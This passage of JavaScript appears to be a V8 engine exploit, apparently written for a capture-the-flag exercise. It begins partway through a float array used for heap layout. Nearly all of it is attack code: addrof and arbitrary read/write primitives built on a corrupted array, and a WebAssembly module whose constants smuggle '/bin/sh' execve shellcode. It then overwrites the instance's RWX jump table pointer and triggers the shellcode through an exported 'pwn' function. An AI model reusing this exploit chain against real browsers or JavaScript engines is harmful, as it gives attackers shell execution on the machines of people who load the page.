1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309, 3.694395479129e-311, 1.390671175876293e-309]

var addrof_array = [fake_object_array, 0]
corrupted_array = re.lastIndex;
var offset = 65
const addrof_array_el = 0x2c3169

// eval("%DebugPrint(corrupted_array)")
// eval("%DebugPrint(fake_object_array)")
// eval("%DebugPrint(addrof_array)")

function addrof(obj) {
    fake_object_array[offset] = helper.pair_i32_to_f64(addrof_array_el, 0x10)
    addrof_array[0] = obj;
    return helper.ftoil(corrupted_array[0]);
}

function read32(addr) {
    fake_object_array[offset] = helper.pair_i32_to_f64(addr - 8, 0x10)
    return helper.ftoil(corrupted_array[0])
}

function read64(addr) {
    fake_object_array[offset] = helper.pair_i32_to_f64(addr - 8, 0x10)
    return helper.f64toi64(corrupted_array[0])
}

function write32(addr, value) {
    let temp = read32(addr+4)
    fake_object_array[offset] = helper.pair_i32_to_f64(addr - 8, 0x10)
    new_val = BigInt(temp) << 32n | BigInt(value)
    corrupted_array[0] = helper.i64tof64(new_val)
}

function write64(addr, value) {
    fake_object_array[offset] = helper.pair_i32_to_f64(addr - 8, 0x10)
    corrupted_array[0] = helper.i64tof64(value)
}

// test = [6.6, 7.7]

// // trying to read test[0] by getting &test.elements
// test_addr = addrof(test)
// test_el_addr = read32(test_addr+8)
// test_0 = read64(test_el_addr+8)
// console.log(helper.i64tof64(test_0), "===", test[0])

// // trying to modify test[0] and test[1] with our write primitive
// console.log(helper.hex(helper.f64toi64(test[0])))
// console.log(helper.hex(helper.f64toi64(test[1])))
// write32(test_el_addr+8, 0x13371337)
// // write32(test_el_addr+8+4, 0x80088008n)
// write64(test_el_addr+8+8, 0xdeadbeefcafebaben)
// console.log(helper.hex(helper.f64toi64(test[0])))
// console.log(helper.hex(helper.f64toi64(test[1])))

var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 8, 2, 96, 0, 1, 124, 96, 0, 0, 3, 3, 2, 0, 1, 7, 14, 2, 4, 109, 97, 105, 110, 0, 0, 3, 112, 119, 110, 0, 1, 10, 76, 2, 71, 0, 68, 104, 110, 47, 115, 104, 88, 235, 7, 68, 104, 47, 98, 105, 0, 91, 235, 7, 68, 72, 193, 224, 24, 144, 144, 235, 7, 68, 72, 1, 216, 72, 49, 219, 235, 7, 68, 80, 72, 137, 231, 49, 210, 235, 7, 68, 49, 246, 106, 59, 88, 144, 235, 7, 68, 15, 5, 144, 144, 144, 144, 235, 7, 26, 26, 26, 26, 26, 26, 11, 2, 0, 11]);
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module, {});
var wmain = instance.exports.main;
for (let j = 0x0; j < 20000; j++) {
    wmain()
}

instance_addr = addrof(instance)
jump_table_start = instance_addr + 0x48
rwx_addr = read64(jump_table_start)
sc_addr = rwx_addr + 0x81an - 0x5n
console.log("[+] Shellcode @", helper.hex(sc_addr+0x5n))

console.log("[+] Overwriting WasmInstanceObject jump_table_start to point to our shellcode")
write32(jump_table_start, sc_addr & BigInt(2**32-1))

 // to trigger jmp to address pointed by jump_table_start, we need another new function
var pwn = instance.exports.pwn;
console.log("[+] Executing shellcode")
pwn();

